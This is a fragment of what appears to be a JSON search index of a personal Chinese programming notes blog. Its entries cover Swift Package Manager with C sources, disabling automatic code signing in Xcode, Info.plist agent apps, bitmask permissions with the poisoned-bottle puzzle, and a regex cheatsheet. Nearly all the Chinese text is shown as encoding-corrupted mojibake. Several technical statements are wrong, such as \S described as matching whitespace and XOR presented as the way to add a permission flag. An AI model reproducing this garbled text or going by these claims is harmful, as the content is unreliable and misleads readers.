‡åŠå…¶ç›¸å…³è®¾ç½®ï¼Œä¾‹å¦‚æ¨¡å—åç§°ã€æºæ–‡ä»¶è·¯å¾„ç­‰ã€‚ åœ¨ Swift åŒ…ä¸­åˆ›å»º C æºæ–‡ä»¶ åœ¨ä½ çš„ Swift åŒ…ç›®å½•ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªåŒ…å« C ä»£ç çš„æºæ–‡ä»¶ï¼Œä¾‹å¦‚ YourPackage/Sources/YourPackage/CFile.cã€‚ åœ¨ C æºæ–‡ä»¶ä¸­ï¼Œç¼–å†™ä½ çš„ C ä»£ç ã€‚ æ›´æ–° Swift åŒ…é…ç½®æ–‡ä»¶ åœ¨ Package.swift æ–‡ä»¶ä¸­ï¼Œå°† C æºæ–‡ä»¶æ·»åŠ åˆ° Swift åŒ…çš„ç›®æ ‡ä¸­ã€‚ ä¿®æ”¹ targets æ•°ç»„ä¸­çš„ç›®æ ‡é…ç½®ï¼Œæ·»åŠ  C æºæ–‡ä»¶çš„è·¯å¾„: // Package.swift // ... targets: [ .target( name: \"YourPackage\", dependencies: [], cSettings: [ .headerSearchPath(\"YourPackage/Sources/YourPackage\"), .unsafeFlags([\"-Xclang\", \"-fmodule-map-file=YourPackage/Sources/YourPackage/module.modulemap\"]), ] ), // ... ], åˆ›å»ºæ¨¡å—æ˜ å°„æ–‡ä»¶ åœ¨ Swift åŒ…ç›®å½•ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º module.modulemap çš„æ¨¡å—æ˜ å°„æ–‡ä»¶ï¼Œ ä¾‹å¦‚ YourPackage/Sources/YourPackage/module.modulemapã€‚ åœ¨æ¨¡å—æ˜ å°„æ–‡ä»¶ä¸­ï¼ŒæŒ‡å®šä½ çš„ C æºæ–‡ä»¶çš„å¯¼å…¥æ–¹å¼: // module.modulemap module YourPackage [system] { header \"CFile.h\" export * } å¯¼å…¥ C ä»£ç  åœ¨ä½ çš„ Swift ä»£ç ä¸­ï¼Œä½¿ç”¨ import è¯­å¥å¯¼å…¥ä½ çš„ Swift åŒ…ã€‚ ç°åœ¨ä½ å¯ä»¥åœ¨ Swift ä»£ç ä¸­ä½¿ç”¨å¯¼å…¥çš„æ¨¡å—å’Œå…¶ä¸­çš„ C ä»£ç : // Swift ä»£ç  import YourPackage // ä½¿ç”¨å¯¼å…¥çš„æ¨¡å—å’Œå…¶ä¸­çš„ C ä»£ç  é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä½ å¯ä»¥ä½¿ç”¨ Swift Package Manager å¯¼å…¥å’Œä½¿ç”¨ C ä»£ç ã€‚ ç¡®ä¿åœ¨ Swift åŒ…çš„é…ç½®æ–‡ä»¶ä¸­æ­£ç¡®æŒ‡å®šäº† C æºæ–‡ä»¶çš„è·¯å¾„ï¼Œå¹¶ä½¿ç”¨æ¨¡å—æ˜ å°„æ–‡ä»¶æ¥å®šä¹‰å¯¼å…¥æ–¹å¼ã€‚ è¯·æ³¨æ„ï¼Œä½¿ç”¨ Swift Package Manager å¯¼å…¥ C ä»£ç éœ€è¦é€‚å½“çš„é…ç½®å’Œç›®å½•ç»“æ„ï¼Œ å¹¶ä¸”éœ€è¦åœ¨æ¨¡å—æ˜ å°„æ–‡ä»¶ä¸­æ­£ç¡®å®šä¹‰ C æºæ–‡ä»¶çš„å¯¼å…¥æ–¹å¼ã€‚ ç¡®ä¿ä½ çš„ C ä»£ç å¯ä»¥æ­£ç¡®ç¼–è¯‘å’Œé“¾æ¥ï¼Œå¹¶åœ¨ Swift ä»£ç ä¸­æŒ‰ç…§é€‚å½“çš„æ–¹å¼ä½¿ç”¨ã€‚","tags":"åç«¯; swift","url":"/yq-backend-swift-spm.html","loc":"/yq-backend-swift-spm.html"},{"title":"ä¸€äº›å¥½ç”¨ä¸‰æ–¹åº“","text":"KeyboardShortcuts é”®ç›˜äº‹ä»¶å¤„ç†åº“: https://swiftpackageindex.com/sindresorhus/KeyboardShortcuts æ”¯æŒå…¨å±€å¿«æ·é”®çš„ç›‘å¬, å®Œç¾æ”¯æŒMacOSçš„æ²™ç›’","tags":"åç«¯; swift","url":"/yq-backend-swift-three-lib.html","loc":"/yq-backend-swift-three-lib.html"},{"title":"Xcodeåˆ é™¤æ‰å¼ºåˆ¶è¯ä¹¦","text":"Xcodeåˆ é™¤æ‰å¼ºåˆ¶è¯ä¹¦/åˆ é™¤æ‰å¼ºåˆ¶å›¢é˜ŸéªŒè¯ å…ˆå…³é—­æ‰xcodeé¡¹ç›®, ç„¶åç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ¯”å¦‚vscodeæ‰“å¼€ é¡¹ç›®é…ç½®æ–‡ä»¶ xxx.xcodeproj , å…¨å±€æœç´¢å¹¶æ›´æ–°ä¸ºä»¥ä¸‹å­—æ®µ: # è¿™ä¸ªè¿™æ ·æ”¹ CODE_SIGN_STYLE = Manual; # è¿™äº›ç›´æ¥åˆ é™¤ä¹Ÿå¯ CODE_SIGN_IDENTITY = \"\" DEVELOPMENT_TEAM = \"\" PROVISIONING_PROFILE_SPECIFIER = \"\"; åŸæ¥çš„å†…å®¹ä¹Ÿè´´ä¸€ä¸‹åšä¸ªå‚è€ƒ: CODE_SIGN_STYLE = Automatic; # æœ€ä¸»è¦å°±æ˜¯è¿™ä¸ªå’ŒTEAM CODE_SIGN_IDENTITY = \"Apple Development\"; DEVELOPMENT_TEAM = \"\"; PROVISIONING_PROFILE_SPECIFIER = \"\"; æ³¨è§£ ä¸è¦åœ¨xcodeé¡¹ç›®æ‰“å¼€çš„æ—¶å€™æ”¹, ä¸ç„¶ä¼šä¿®æ”¹å¤±è´¥(å¤šåŠä¼šè¢«å†…å­˜ä¸­çš„è¦†ç›–æ‰) é‡æ–°æ‰“å¼€xcode, åœ¨ Target ä¸­çœ‹çœ‹å¯¹ä¸å¯¹, ä¸å¯¹å°±æŒ‰è¿™æ ·é€‰æ‹© ä»¥åŠåœ¨ build setting ä¸­çš„ Signing è®¾ç½®ä¸‹ æ³¨è§£ é¡ºä¾¿åæ§½ä¸€å¥, xcode å¤ªéš¾ç”¨","tags":"åç«¯; swift","url":"/yq-backend-swift-xode-conf-del-cert.html","loc":"/yq-backend-swift-xode-conf-del-cert.html"},{"title":"Xcodeçš„Infoé…ç½®","text":"é…ç½®ä½ç½® è¿™é‡Œé…ç½®æ—¶, ä¼šè‡ªåŠ¨æ–°å»ºä¸€ä¸ªinfo.plistæ–‡ä»¶. è‹¥è¿™é‡Œæ²¡æœ‰ç›¸åº”çš„é€‰é¡¹, é‚£ä¹ˆå¯ç‚¹å‡»ä»»æ„æ¡ç›®çš„ + è¿›è¡Œæ–°å¢, å¦‚å›¾: ä¸‹é¢ä»‹ç»å¸¸è§æ¡ç›®ä½œç”¨ Application is agent (UIElement): boolean ç”¨æ¥å°†åº”ç”¨ç¨‹åºè®¾ç½®ä¸ºä»£ç†ï¼ˆagentï¼‰åº”ç”¨ç¨‹åºã€‚ åº”ç”¨ç¨‹åºå°†ä»¥æ— çª—å£çš„å½¢å¼è¿è¡Œï¼Œå¹¶ä¸”ä¸ä¼šåœ¨ Dock ä¸­æ˜¾ç¤ºåº”ç”¨ç¨‹åºå›¾æ ‡ã€‚ é€šå¸¸ç”¨äºå®ç°åå°ä»»åŠ¡ã€ç³»ç»Ÿçº§åˆ«çš„æœåŠ¡æˆ–èœå•æ åº”ç”¨ç¨‹åºç­‰ã€‚ ä»£ç†åº”ç”¨ç¨‹åºåœ¨åå°è¿è¡Œï¼Œä¸ä¼šå¹²æ‰°ç”¨æˆ·çš„å·¥ä½œæµç¨‹ï¼Œä½†ä»ç„¶å¯ä»¥æä¾›æŸäº›åŠŸèƒ½æˆ–æœåŠ¡ã€‚ éšè—åº”ç”¨ç¨‹åºå›¾æ ‡ï¼šè®¾ç½®åº”ç”¨ç¨‹åºä¸ºä»£ç†åº”ç”¨ç¨‹åºåï¼Œåº”ç”¨ç¨‹åºçš„å›¾æ ‡å°†ä¸ä¼šæ˜¾ç¤ºåœ¨ Dock ä¸­ï¼Œä»è€Œä¸ä¼šå ç”¨ Dock çš„ç©ºé—´ æ— çª—å£è¿è¡Œï¼šä»£ç†åº”ç”¨ç¨‹åºé€šå¸¸ä¸éœ€è¦æ˜¾ç¤ºçª—å£ï¼Œå› æ­¤å®ƒä»¬ä»¥æ— çª—å£çš„å½¢å¼è¿è¡Œï¼Œä¸ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºç”¨æˆ·ç•Œé¢ã€‚ åå°ä»»åŠ¡ï¼šä»£ç†åº”ç”¨ç¨‹åºå¯ä»¥åœ¨åå°æ‰§è¡Œä»»åŠ¡ï¼Œä¾‹å¦‚ç›‘æ§ç³»ç»Ÿäº‹ä»¶ã€å®šæ—¶ä»»åŠ¡ã€ç½‘ç»œè¯·æ±‚ç­‰ã€‚ ç³»ç»Ÿçº§åˆ«çš„æœåŠ¡ï¼šä»£ç†åº”ç”¨ç¨‹åºå¯ä»¥æä¾›ç³»ç»Ÿçº§åˆ«çš„æœåŠ¡ï¼Œä¾‹å¦‚å…¨å±€å¿«æ·é”®ç›‘å¬ã€å‰ªè´´æ¿æ“ä½œã€èœå•æ æ‰©å±•ç­‰ã€‚ é¢å¤–ä½œç”¨: çª—å£é»˜è®¤æ”¯æŒ æ˜¾ç¤ºåœ¨å…¶ä»–å…¨å±åº”ç”¨ä¸Šæ–¹ (å¯èƒ½æ˜¯å› ä¸ºå±äºç³»ç»Ÿçº§)","tags":"åç«¯; swift","url":"/yq-backend-swift-xode-conf-info.html","loc":"/yq-backend-swift-xode-conf-info.html"},{"title":"xcode15æ–°åŠŸèƒ½","text":"é¢„è§ˆå®-Preview æ–°ç‰ˆæœ¬å¦‚æœè¦é¢„è§ˆ swiftUI, ç›´æ¥: #Preview { ContentView() } å³å¯ å‚è€ƒ: https://juejin.cn/post/7244109491897401381","tags":"åç«¯; swift","url":"/yq-backend-swift-xode-new-f.html","loc":"/yq-backend-swift-xode-new-f.html"},{"title":"Xcode-åˆ†å‘æ‰“åŒ…","text":"Xcodeç‰ˆæœ¬: 15.1(15C65) å½“å‰ç‰ˆæœ¬ åœ¨æ­¤ä½ç½®ç¼–è¾‘Schema æˆ–è€…åœ¨ Product - Schema ç¼–è¾‘Schema Product - Archive è¿›è¡Œæ‰“åŒ… æ‰“åŒ…ä½ç½® ç„¶åä¼šè¿›å…¥ Archive ç•Œé¢, é€‰æ‹© Distribute App æ³¨æ„, Archive ç•Œé¢ä¹Ÿå¯ä»¥é€šè¿‡ Window - Organizer è¿›å…¥: æ²¡è´­ä¹°å®˜æ–¹å¼€å‘è€…è´¦å·çš„å°±é€‰ Custom æ¥å¯¼å‡ºå‰¯æœ¬åˆ°æœ¬åœ° æ­£è§„Appå¼€å‘è€…è´¦å·ä¸Šä¼ åç»­å¯ä»¥å‚è€ƒ: https://zhuanlan.zhihu.com/p/583812511","tags":"åç«¯; swift","url":"/yq-backend-swift-xode-pack-dist.html","loc":"/yq-backend-swift-xode-pack-dist.html"},{"title":"å…³äºä½æ©ç ","text":"ä½æ©ç ï¼ˆBitMaskï¼‰ï¼Œæ˜¯\"ä½ï¼ˆBitï¼‰\"å’Œ\"æ©ç ï¼ˆMaskï¼‰\"çš„ç»„åˆè¯ã€‚ \"ä½\"æŒ‡ä»£ç€äºŒè¿›åˆ¶æ•°æ®å½“ä¸­çš„äºŒè¿›åˆ¶ä½ï¼Œ è€Œ\"æ©ç \"æŒ‡çš„æ˜¯ä¸€ä¸²ç”¨äºä¸ç›®æ ‡æ•°æ®è¿›è¡ŒæŒ‰ä½æ“ä½œçš„äºŒè¿›åˆ¶æ•°å­—ã€‚ ç»„åˆèµ·æ¥ï¼Œå°±æ˜¯\"ç”¨ä¸€ä¸²äºŒè¿›åˆ¶æ•°å­—ï¼ˆæ©ç ï¼‰å»æ“ä½œå¦ä¸€ä¸²äºŒè¿›åˆ¶æ•°å­—\"çš„æ„æ€ã€‚ ä¸€èˆ¬å°†1å·¦ç§»å¤šå°‘ä½è¡¨ç¤ºä½æ©ç æ¥è¿›è¡Œä½è¿ç®—, è§£å†³å½“æ•°é‡å¤šæ—¶, åˆ¤æ–­çš„å¤æ‚åº¦é«˜çš„é—®é¢˜ æ³¨è§£ 1 << 0 è¡¨ç¤º 1å·¦ç§»0ä½ , è€Œä¸æ˜¯ 0å·¦ç§»1ä½ å¸¸è§äºæƒé™åˆ†é… æ¯”å¦‚ä¸€ä¸ªç³»ç»Ÿæœ‰å››ä¸ªæƒé™ä½: delete = 0 read = 1 update = 2 create = 3 ä½†æ˜¯å¦‚æœç”¨ä½æ©ç (mask = 0b1)æ¥æŸ¥è¯¢æ˜¯å¦æœ‰updateæƒé™: delete = 1 << 0 // 0000 0001 read = 1 << 1 // 0000 0010 update = 1 << 2 // 0000 0100 create = 1 << 3 // 0000 1000 å¦‚æœç”¨æˆ·çš„åªæœ‰è¯»æƒé™ update, ç›´æ¥boolåˆ¤æ–­: 1 << 1 & 1 << 2 // false, 0000 0010 & 0000 0100 å¦‚æœè¦åŠ  update , ä½¿ç”¨å¼‚æˆ–: 1 << 1 &#94; 1 << 2 // 0000 0010 &#94; 0000 0100 = 0000 0110 å¦‚æœ è¿›åˆ¶è¡¨ç¤ºå‰ç¼€ äºŒè¿›åˆ¶å‰ç¼€: 0b ç»å…¸é—®é¢˜-3åªè€é¼ æ‰¾8ç“¶æ°´æ¯’ æœ‰ä¸€ä¸ªå¾ˆç»å…¸çš„ç®—æ³•é¢˜ï¼Œè¯´æ˜¯æœ‰1000ä¸ªä¸€æ¨¡ä¸€æ ·çš„ç“¶å­ï¼Œ å…¶ä¸­æœ‰999ç“¶æ˜¯æ™®é€šçš„æ°´ï¼Œæœ‰ä¸€ç“¶æ˜¯æ¯’è¯ã€‚ ä»»ä½•å–ä¸‹æ¯’è¯çš„ç”Ÿç‰©éƒ½ä¼šåœ¨ä¸€æ˜ŸæœŸä¹‹åæ­»äº¡ã€‚ ç°åœ¨ï¼Œä½ åªæœ‰10åªå°ç™½é¼ å’Œä¸€æ˜ŸæœŸçš„æ—¶é—´ï¼Œå¦‚ä½•æ£€éªŒå‡ºå“ªä¸ªç“¶å­é‡Œæœ‰æ¯’è¯ï¼Ÿ å¦‚æœæŒ‰ç…§å¸¸è§„çš„è§£æ³•æ˜¯ä¸æ˜¯å¾ˆç¹çï¼Œæˆ‘ä»¬ä¸å¦¨æ€è€ƒä¸€ä¸‹ç”¨äºŒè¿›åˆ¶æ¥å¤„ç†ã€‚ å…·ä½“å®ç°è·Ÿ 3ä¸ªè€é¼ ç¡®å®š8ä¸ªç“¶å­ åŸç†ä¸€æ ·: 000=0 001=1 010=2 011=3 100=4 101=5 110=6 111=7 ä¸€ä½è¡¨ç¤ºä¸€ä¸ªè€é¼ ï¼Œ0-7è¡¨ç¤º8ä¸ªç“¶å­ã€‚ ä¹Ÿå°±æ˜¯åˆ†åˆ«å°†1ã€3ã€5ã€7å·ç“¶å­çš„è¯æ··èµ·æ¥ç»™è€é¼ 1åƒï¼Œ 2ã€3ã€6ã€7å·ç“¶å­çš„è¯æ··èµ·æ¥ç»™è€é¼ 2 åƒï¼Œ 4ã€5ã€6ã€7å·ç“¶å­çš„è¯æ··èµ·æ¥ç»™è€é¼ 3åƒï¼Œ å“ªä¸ªè€é¼ æ­»äº†ï¼Œç›¸åº”çš„ä½æ ‡1ã€‚ å¦‚è€é¼ 1æ­»äº†ã€è€é¼ 2æ²¡æ­»ã€è€é¼ 3æ­»äº†ï¼Œé‚£ä¹ˆå°±æ˜¯ 101=5å·ç“¶å­æœ‰æ¯’ã€‚ åŒæ ·é“ç†10ä¸ªè€é¼ å¯ä»¥ç¡®å®š1000ä¸ªç“¶å­ã€‚","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-About-bit-cover.html","loc":"/yq-doc-source-docs-Chaotic-About-bit-cover.html"},{"title":"å…³äºé›ªçƒ-çˆ†ä»“","text":"åœ°å€: https://www.huxiu.com/article/2563407.html é˜²æ­¢åœ°å€å¤±æ•ˆ, ææˆpdfäº†, ../../resources/pdf/å’‹å°±çˆ†ä»“äº†ï¼Ÿ3åˆ†é’Ÿææ‡‚é›ªçƒäº§å“-è™å—…ç½‘.pdf","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-About-snowball.html","loc":"/yq-doc-source-docs-Chaotic-About-snowball.html"},{"title":"æµè§ˆå™¨åœ°å€æ è¾“å…¥url","text":"æœ«å°¾åŠ ä¸åŠ /çš„åŒºåˆ« ä¸€èˆ¬æƒ…å†µä¸‹ ä¸åŠ  / ä¼šå½“ä½œä¸‹è½½èµ„æº, æ¯”å¦‚chromeå°±ä¼šç›´æ¥è§¦å‘ä¸‹è½½ åŠ  / å½“ä½œåœ°å€ç›®å½•è®¿é—®","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Browser-input-URL.html","loc":"/yq-doc-source-docs-Chaotic-Browser-input-URL.html"},{"title":"MODä¹‹æ—…","text":"å¡å°”è¾¾çš„MOD ç´ ææ›¿æ¢éœ€è¦è½¬æ¢ RSTB (ResourceSizeTable.product.srsizetabl)ï¼Œ å³ï¼š æ¸¸æˆå†…éƒ¨RAMåˆ†é… (åˆ›å»ºBNPçš„æ—¶å€™ ä¼šè®¡ç®—) BNPéƒ½ä¼šå¸¦RSTBä¿¡æ¯, å³ logs/rstb.json ä¸€äº›å·¥å…·ï¼š SICç‹¬ç«‹ç‰©å“ç”Ÿæˆå™¨ Blenderï¼š å»ºæ¨¡è½¯ä»¶ ToolBoxï¼š æ¨¡å‹æå–ã€Blenderå¼„å¥½çš„é¢„è§ˆ Bcmlï¼š bnpç”Ÿæˆï¼Œ MODæ•´åˆ","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-MOD-journey.html","loc":"/yq-doc-source-docs-Chaotic-MOD-journey.html"},{"title":"æ­£åˆ™è¡¨è¾¾å¼","text":"æ­£åˆ™è¡¨è¾¾å¼ - èœé¸Ÿæ•™ç¨‹: https://www.runoob.com/regexp/regexp-syntax.html å­—ç¬¦è¡¨ç¤º æ™®é€šå­—ç¬¦ [...] åŒ¹é… [...] ä¸­çš„æ‰€æœ‰å­—ç¬¦ [&#94;...] åŒ¹é…é™¤äº† [...] ä¸­çš„æ‰€æœ‰å­—ç¬¦ \\s åŒ¹é…æ‰€æœ‰çš„ç©ºç™½å­—ç¬¦, åŒ…æ‹¬æ¢è¡Œ \\S åŒ¹é…æ‰€æœ‰ç©ºç™½ç¬¦, ä¸åŒ…æ‹¬æ¢è¡Œ \\w åŒ¹é…å­—æ¯, æ•°å­—, ä¸‹åˆ’çº¿. ç­‰ä»·äº [A-Za-z0-9] å­—ç¬¦ æè¿° [ABC] åŒ¹é… [...] ä¸­çš„æ‰€æœ‰å­—ç¬¦, ä¾‹å¦‚ `[aeiou] åŒ¹é…å­—ç¬¦ä¸² google runoob taobao ä¸­æ‰€æœ‰çš„ e o u a å­—æ¯. [&#94;ABC] åŒ¹é…é™¤äº† [...] ä¸­å­—ç¬¦çš„æ‰€æœ‰å­—ç¬¦, ä¾‹å¦‚ [&#94;aeiou] åŒ¹é…å­—ç¬¦ä¸² google runoob taobao ä¸­é™¤äº† e o u a å­—æ¯çš„æ‰€æœ‰å­—æ¯. [A-Z] [A-Z] è¡¨ç¤ºä¸€ä¸ªåŒºé—´, åŒ¹é…æ‰€æœ‰å¤§å†™å­—æ¯, [a-z] è¡¨ç¤ºæ‰€æœ‰å°å†™å­—æ¯. . åŒ¹é…é™¤æ¢è¡Œç¬¦ (\\n, \\r) ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦, ç›¸ç­‰äº [&#94;\\n\\r] [\\s\\S] åŒ¹é…æ‰€æœ‰. \\s æ˜¯åŒ¹é…æ‰€æœ‰ç©ºç™½ç¬¦, åŒ…æ‹¬æ¢è¡Œ, \\S éç©ºç™½ç¬¦, ä¸åŒ…æ‹¬æ¢è¡Œ. \\w åŒ¹é…å­—æ¯, æ•°å­—, ä¸‹åˆ’çº¿. ç­‰ä»·äº [A-Za-z0-9_] éæ‰“å°å­—ç¬¦ å­—ç¬¦ æè¿° \\cx åŒ¹é…ç”± x æŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦. ä¾‹å¦‚, \\cM åŒ¹é…ä¸€ä¸ª Control-M æˆ–å›è½¦ç¬¦. x çš„å€¼å¿…é¡»ä¸º A-Z æˆ– a-z ä¹‹ä¸€. å¦åˆ™, å°† c è§†ä¸ºä¸€ä¸ªåŸä¹‰çš„ 'c' å­—ç¬¦. \\f åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦. ç­‰ä»·äº \\x0c å’Œ \\cL . \\n åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦. ç­‰ä»·äº \\x0a å’Œ \\cJ . \\r åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦. ç­‰ä»·äº \\x0d å’Œ \\cM . \\s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦, åŒ…æ‹¬ç©ºæ ¼, åˆ¶è¡¨ç¬¦, æ¢é¡µç¬¦ç­‰ç­‰. ç­‰ä»·äº [ \\f\\n\\r\\t\\v] . æ³¨æ„ Unicode æ­£åˆ™è¡¨è¾¾å¼ä¼šåŒ¹é…å…¨è§’ç©ºæ ¼ç¬¦. \\S åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦. ç­‰ä»·äº [&#94; \\f\\n\\r\\t\\v] . \\t åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦. ç­‰ä»·äº \\x09 å’Œ \\cI . \\v åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦. ç­‰ä»·äº \\x0b å’Œ \\cK . ç‰¹æ®Šå­—ç¬¦ ä¸€äº›æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ è‹¥è¦åŒ¹é…è¿™äº›ç‰¹æ®Šå­—ç¬¦, å¿…é¡»é¦–å…ˆä½¿å­—ç¬¦\"è½¬ä¹‰\", å³, å°†åæ–œæ å­—ç¬¦æ”¾åœ¨å®ƒä»¬å‰é¢. ç‰¹åˆ«å­—ç¬¦ æè¿° $ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®. å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§, åˆ™ $ ä¹ŸåŒ¹é… \\n æˆ– \\r . è¦åŒ¹é… $ å­—ç¬¦æœ¬èº«, è¯·ä½¿ç”¨ \\$ ( ) æ ‡è®°ä¸€ä¸ªå­è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸä½ç½®. å­è¡¨è¾¾å¼å¯ä»¥è·å–ä¾›ä»¥åä½¿ç”¨. è¦åŒ¹é…è¿™äº›å­—ç¬¦, è¯·ä½¿ç”¨ \\( å’Œ \\) * åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡. è¦åŒ¹é… * å­—ç¬¦, è¯·ä½¿ç”¨ \\* + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡. è¦åŒ¹é… + å­—ç¬¦, è¯·ä½¿ç”¨ \\+ . . åŒ¹é…é™¤æ¢è¡Œç¬¦ \\n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦. è¦åŒ¹é… . , è¯·ä½¿ç”¨ \\. . [ æ ‡è®°ä¸€ä¸ªä¸­æ‹¬å·è¡¨è¾¾å¼çš„å¼€å§‹. è¦åŒ¹é… [ , è¯·ä½¿ç”¨ \\[ . ? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡, æˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦. è¦åŒ¹é… ? å­—ç¬¦, è¯·ä½¿ç”¨ \\? \\ å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºæˆ–ç‰¹æ®Šå­—ç¬¦, æˆ–åŸä¹‰å­—ç¬¦, æˆ–å‘åå¼•ç”¨, æˆ–å…«è¿›åˆ¶è½¬ä¹‰ç¬¦. ä¾‹å¦‚, n åŒ¹é…å­—ç¬¦ n . \\n åŒ¹é…æ¢è¡Œç¬¦. åºåˆ— \\\\ åŒ¹é… \\ , è€Œ \\( åˆ™åŒ¹é… ( &#94; åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®, é™¤éåœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨, å½“è¯¥ç¬¦å·åœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ—¶, è¡¨ç¤ºä¸æ¥å—è¯¥æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­çš„å­—ç¬¦é›†åˆ. è¦åŒ¹é… &#94; å­—ç¬¦æœ¬èº«, è¯·ä½¿ç”¨ \\&#94; { æ ‡è®°é™å®šç¬¦è¡¨è¾¾å¼çš„å¼€å§‹. è¦åŒ¹é… { , è¯·ä½¿ç”¨ \\{ . é™å®šç¬¦ é™å®šç¬¦ç”¨æ¥æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç»™å®šç»„ä»¶å¿…é¡»è¦å‡ºç°å¤šå°‘æ¬¡æ‰èƒ½æ»¡è¶³åŒ¹é…. æœ‰ * æˆ– + æˆ– ? æˆ– {n} æˆ– {n,} æˆ– {n,m} å…±6ç§. æ­£åˆ™è¡¨è¾¾å¼çš„é™å®šç¬¦æœ‰: å­—ç¬¦ æè¿° * åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡. ä¾‹å¦‚, zo* èƒ½åŒ¹é… \"z\" ä»¥åŠ \"zoo\". * ç­‰ä»·äº {0,} . + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡. ä¾‹å¦‚, 'zo+' èƒ½åŒ¹é… \"zo\" ä»¥åŠ \"zoo\", ä½†ä¸èƒ½åŒ¹é… \"z\". + ç­‰ä»·äº {1,} . ? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡. ä¾‹å¦‚, \"do(es)?\" å¯ä»¥åŒ¹é… \"do\" , \"does\" ä¸­çš„ \"does\" , \"doxy\" ä¸­çš„ \"do\" . ? ç­‰ä»·äº {0,1} . {n} n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°. åŒ¹é…ç¡®å®šçš„ n æ¬¡. ä¾‹å¦‚, 'o{2}' ä¸èƒ½åŒ¹é… \"Bob\" ä¸­çš„ 'o', ä½†æ˜¯èƒ½åŒ¹é… \"food\" ä¸­çš„ä¸¤ä¸ª o. {n,} n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°. è‡³å°‘åŒ¹é…n æ¬¡. ä¾‹å¦‚, 'o{2,}' ä¸èƒ½åŒ¹é… \"Bob\" ä¸­çš„ 'o', ä½†èƒ½åŒ¹é… \"foooood\" ä¸­çš„æ‰€æœ‰ o. 'o{1,}' ç­‰ä»·äº 'o+' . 'o{0,}' åˆ™ç­‰ä»·äº 'o*' . {n,m} m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°, å…¶ä¸­n <= m. æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡. ä¾‹å¦‚, \"o{1,3}\" å°†åŒ¹é… \"fooooood\" ä¸­çš„å‰ä¸‰ä¸ª o. 'o{0,1}' ç­‰ä»·äº 'o?'. è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼. æ­£åˆ™è¡¨è¾¾å¼-ç®€æ´ç‰ˆ æ­£åˆ™è¡¨è¾¾å¼(regular expression)æè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰, å¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸², å°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ªä¸²ä¸­å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶çš„å­ä¸²ç­‰. â€‹å­—ç¬¦ç±»: . #ä»»æ„ä¸€ä¸ªå­—ç¬¦ [] #åŒ¹é…æ‹¬å·ä¸­çš„ä¸€ä¸ªå­—ç¬¦ - #æ‹¬å·å†…è¡¨ç¤ºèŒƒå›´ &#94; #ä½äºæ‹¬å·å†…å¼€å¤´è¡¨ç¤ºä¸åŒ¹é…æ‹¬å·å†…çš„ [&#94;0-3] éï¼ˆ0åˆ°3ï¼‰ä¹‹é—´ [[:xxx:]] #grepå·¥å…·é¢„å®šä¹‰çš„ä¸€äº›å‘½ä»¤å­—ç¬¦ç±» æ•°é‡é™å®šç¬¦: ? #åŒ¹é…0æˆ–è€…1æ¬¡ + #å‰ä¸€ä¸ªå•å…ƒåŒ¹é…ä¸€æ¬¡æˆ–è€…å¤šæ¬¡ * #åŒ¹é…å‰ä¸€ä¸ªå•å…ƒ0æ¬¡æˆ–å¤šæ¬¡ {N} #å‰ä¸€ä¸ªå•å…ƒåŒ¹é…Næ¬¡ {N,} 